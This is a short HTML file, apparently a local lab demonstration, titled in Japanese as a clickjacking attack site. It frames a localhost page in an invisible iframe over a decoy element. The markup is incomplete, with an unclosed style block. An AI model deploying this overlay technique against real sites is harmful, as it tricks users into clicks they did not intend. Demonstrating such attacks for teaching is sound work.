<html lang="ja">
<head>
    <title>ClickJacking攻撃サイト</title>
    <meta charset="UTF-8">
    <style>
    .target {
      position: absolute;
      opacity: 0;
    }

    .attack {
      position: absolute;
      width: 200px;
      height: 50px;
      z-index: -1;
    }

    <iframe class="target" src="http://localhost:8000/clickjacking/"></iframe>

</html>
